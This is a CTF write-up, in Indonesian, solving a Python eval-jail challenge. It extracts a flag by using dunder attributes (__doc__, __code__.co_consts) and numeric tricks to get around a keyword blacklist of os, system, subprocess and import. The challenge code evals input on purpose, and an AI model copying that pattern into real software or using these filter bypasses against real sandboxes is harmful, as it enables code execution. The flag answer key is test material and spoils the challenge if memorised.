# [500 pts] Definitely Safe Safe Program
### Category: Miscellaneous

**Deskripsi:**
> I have made sure to filter my user inputs! Surely you can't get the flag...  
>   
> md5("COMPFEST16{flag_sha256(flag)[:10]}") = 950ff9f6286154973ea41436b0320001.  
> md5 ini digunakan untuk memvalidasi apakah flag yang kalian dapat sudah sesuai atau belum, jika kalian mengkomputasi md5 dari flag yang
> kalian dapatkan dan hasilnya tidak sesuai dengan yang diberikan, maka flag kalian belum benar.  
>   
> Author: Zanark  
>   
> nc challenges.ctf.compfest.id 20004

**main.py:**
```python
"""
Welcome to my first Python program!!!

This program will be able to execute most Python
statements just like the REPL, but I have made sure
to sanitize the input so you won't be able to hack
my computer!!!

But... if you somehow managed to hack my computer
here is a gift from me COMPFEST16{PART1_
"""

__file__ = "Nothing here..."

def safe(s):
    blacklist = ["os", "system", "\\", "(", ")", "io", "subprocess", "Popen", "=", "0", "1", "2", "+", "3", "4", "5", "PART2}","6", "7", "8", "9", "import", "-", "globals", "locals", "vars"]
    return not any(c in s for c in blacklist)


if __name__ == "__main__":
    while True:
        cmd = ascii(input(">>> "))
        if not safe(cmd):
            print("Not Allowed!!!")
            continue
            
        result = eval(eval(cmd))
        print(str(result)[:25])
```

### Solusi: 
Challenge memberi program yang bekerja seperti python console namun dengan beberapa filter yang diberikan pada input. Program juga membatasi hanya maksimal 25 karakter output saja yang bisa terlihat.

Tujuan kita disini yaitu mengambil flag yang dibagi menjadi 2 bagian. Karena program bekerja seperti python console, akan kita gunakan "[dunder](https://www.geeksforgeeks.org/dunder-magic-methods-python/)".

Bagian pertama flag terletak pada comment diawal program, dan bagian kedua di dalam list 'blacklist' pada fungsi safe().

Untuk bagian pertama, perhatikan bahwa flag terletak pada comment pada bagian awal program. Comment pada bagian awal program atau suatu fungsi akan dianggap sebagai documentation oleh python.

Comment tersebut disebut juga sebagai 'docstring' yang dapat dibaca melalui attribut [\_\_doc__](https://www.geeksforgeeks.org/python-docstrings/).
```python
>>> __doc__

Welcome to my first Pyth
```

Perhatikan bahwa flag bagian pertama terletak pada bagian akhir docstring. Sehingga kita dapat menggunakan index -1 untuk mengambil secara reverse (didapat bagian akhir terlebih dahulu).

Kita tidak bisa langsung melakukan index karena karakter numeric dan karaker '-' di filter. Maka yang akan kita gunakan yaitu 'False' dan '~'.
```python
~0 == -1
False == 0
~False == -1
__doc__[::~False] == __doc__[::-1]
```

**Note:** '~' adalah operator unary invert.

Sehingga untuk mendapatkan flag bagian 1 dapat digunakan command:
```python
>>> __doc__[::~False]

rts3tYb_x3dn1{61TSEFPMOC
```
Bagian pertama flag akan terbalik, sehingga perlu di reverse kembali.  

> Flag 1: **COMPFEST16{1nd3x_bYt3str**

Untuk flag bagian kedua berada di dalam elemen ke 16 list 'blacklist', yang terletak pada fungsi safe().

Karena kita perlu melihat nilai dalam variabel pada fungsi safe(), maka pertama kita ubah safe() menjadi codeobject dengan '\_\_code__'.

Kemudian dari codeobject yang dihasilkan, kita gunakan 'co_consts' untuk melihat nilai-nilai yang digunakan fungsi.

Untuk informasi lebih lanjut mengenai '\_\_code__' dan 'co_consts': https://docs.python.org/3/reference/datamodel.html
```python
>>> safe.__code__.co_consts
(None, ('os', 'system', '
```

Terlihat bahwa isi list 'blacklist' terletak pada index pertama tuple yang di-output, sehingga bisa kita tambahkan index 1 dengan menggunakan nilai 'True'.
```python
>>> safe.__code__.co_consts[True]
('os', 'system', '\\', '(
```

Selanjutnya karena flag bagian kedua berada pada index ke 16, perlu kita tambahkan index 16 pada tuple yang di-output.

Untuk meng-bypass filter karakter numeric, maka dapat kita gunakan binary string dan xor operator untuk mendapat nilai 16:
```python
46 ^ 62 == 16

b'.'[0] == ord('.') == 46

b'>'[0] == ord('>') ==  62

b'.'[0] ^ b'>'[0] == 16

b'.'[False] ^ b'>'[False] == 16
```

Sehingga command yang akan diberikan yaitu:
```python
>>> safe.__code__.co_consts[True][b'.'[False] ^ b'>'[False]]
1ng_g1v3s_1nT_e732bbe217}
```

> Flag 2: **1ng_g1v3s_1nT_e732bbe217}**

Sehingga flag akhir dapat didapatkan dengan menggabunkan flag 1 dan flag 2.

> Flag: **COMPFEST16{1nd3x_bYt3str1ng_g1v3s_1nT_e732bbe217}**
